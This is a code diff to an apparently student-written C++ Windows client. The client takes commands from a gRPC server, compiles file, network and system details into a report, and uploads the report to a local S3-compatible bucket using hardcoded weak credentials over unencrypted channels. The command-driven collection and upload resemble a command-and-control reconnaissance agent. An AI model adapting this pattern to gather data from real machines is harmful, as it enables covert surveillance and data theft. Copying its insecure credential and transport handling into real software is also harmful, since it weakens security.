@@ -2,11 +2,20 @@
 #include <memory>
 #include <string>
 #include <filesystem>
+#include <fstream>
 #include <grpcpp/grpcpp.h>
 #include "com.grpc.pb.h"
 #include <Windows.h>
 #include <iphlpapi.h>
 #include <winsock2.h>
+#include <fstream>
+
+#include <aws/core/Aws.h>
+#include <aws/core/auth/AWSCredentialsProvider.h>
+#include <aws/core/client/ClientConfiguration.h>
+#include <aws/s3/S3Client.h>
+#include <aws/s3/model/PutObjectRequest.h>
+#include <aws/core/utils/Outcome.h>
 
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "user32.lib")
@@ -94,12 +103,52 @@ std::string ReadSystemInfo() {
     return sysInfo;
 }
 
+std::string ReportInfo() {
+    std::string info;
+    info += "\nCommand Files:\n";
+    info += ReadFiles();
+    info += "Command Network:\n";
+    info += ReadNetwork();
+    info += "Command SystemInfo:\n";
+    info += ReadSystemInfo();
+    return info;
+}
+
+void MyUploadS3() {
+    Aws::SDKOptions options;
+    Aws::InitAPI(options);
+    {
+        //Конфигурация клиента
+        Aws::Client::ClientConfiguration Config;
+        Config.scheme = Aws::Http::Scheme::HTTP;
+        Config.endpointOverride = "localhost:9000";
+        Aws::Auth::AWSCredentials credentials("qwerty123", "qwerty1234");
+        Aws::S3::S3Client s3_client(credentials, Config, Aws::Client::AWSAuthV4Signer::PayloadSigningPolicy::Never, false);
+
+        //Запрос
+        Aws::S3::Model::PutObjectRequest Request;
+        Request.SetBucket("mybucket");
+        Request.SetKey("Report");
+        auto data = Aws::MakeShared<Aws::FStream>("SampleAllocationTag", "C:/Users/Kirill/source/Work2/MainClient/report.txt", std::ios_base::in | std::ios_base::binary);
+        Request.SetBody(data);
+
+        //Отправка запроса
+        auto Send = s3_client.PutObject(Request);
+        if (Send.IsSuccess()) {
+            std::cout << "File uploaded successfully!" << std::endl;
+        }
+        else {
+            std::cout << "Error uploading file " << std::endl;
+        }
+    }
+    Aws::ShutdownAPI(options);
+}
+
 int main(int argc, char** argv) {
     std::string target_str = "192.168.44.130:50051";
     CommandClient client(grpc::CreateChannel(target_str, grpc::InsecureChannelCredentials()));
     std::string command = client.GetCommand();
     std::cout << "Command: " << command << std::endl;
-
     std::string response;
     if (command == "Files") {
         response = ReadFiles();
@@ -110,11 +159,26 @@ int main(int argc, char** argv) {
     else if (command == "SystemInfo") {
         response = ReadSystemInfo();
     }
+    else if (command == "Report") {
+        response = ReportInfo();
+        std::ofstream Report("C:/Users/Kirill/source/Work2/MainClient/report.txt", std::ios_base::binary);
+        if (!Report.is_open()) {
+            std::cerr << "Error opening file for writing." << std::endl;
+            exit(1);
+        }
+        Report.write(response.c_str(), response.size());
+        if (Report.fail()) {
+            std::cerr << "Error writing to file." << std::endl;
+            Report.close();
+            exit(1);
+        }
+        Report.close();
+    }
     else {
         response = "Unknown " + command;
     }
-
     client.SendResponse(response);
+    MyUploadS3();
     return 0;
 }
 
